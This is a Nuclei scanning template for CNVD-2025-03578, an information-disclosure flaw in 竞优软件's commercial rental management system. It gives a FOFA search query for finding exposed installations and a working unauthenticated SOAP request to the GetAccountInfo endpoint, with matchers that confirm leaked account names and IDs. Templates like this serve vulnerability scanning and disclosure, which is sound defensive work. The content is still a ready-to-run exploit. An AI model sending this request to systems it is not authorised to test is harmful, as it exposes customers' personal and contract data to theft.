id: jingyou-shangyezulin-Information-disclosure-CNVD-2025-03578

info:
  name: 竞优软件 商业租赁管理系统 信息泄露漏洞(CNVD-2025-03578)
  author: Superhero
  severity: medium
  description: |-
    fofa: title="商业租赁管理系统" || body="Silverlight/install/Silverlight5.exe" || body="pageUrl = \"/loading.aspx\"" || body="竞优软件</a>"
    竞优软件 商业租赁管理系统存在严重的信息泄露漏洞，攻击者可利用该漏洞非法获取用户敏感信息，如租赁合同、客户数据等，可能导致重大经济损失和隐私泄露风险。
  reference:
    - https://mp.weixin.qq.com/s/dcBZcg8XkeZoCwoffE1vAA
  tags: Information disclosure

http:
  - raw:
      - |
        POST /rental/contract/api/account.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://tempuri.org/GetAccountInfo

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope 
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
            xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
                <GetAccountInfo xmlns="http://tempuri.org/" />
            </soap:Body>
        </soap:Envelope>  

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"Name":"'
          - '"Accountid":'
          - '"Iscompany":"'
        condition: and
      - type: status
        status: 
          - 200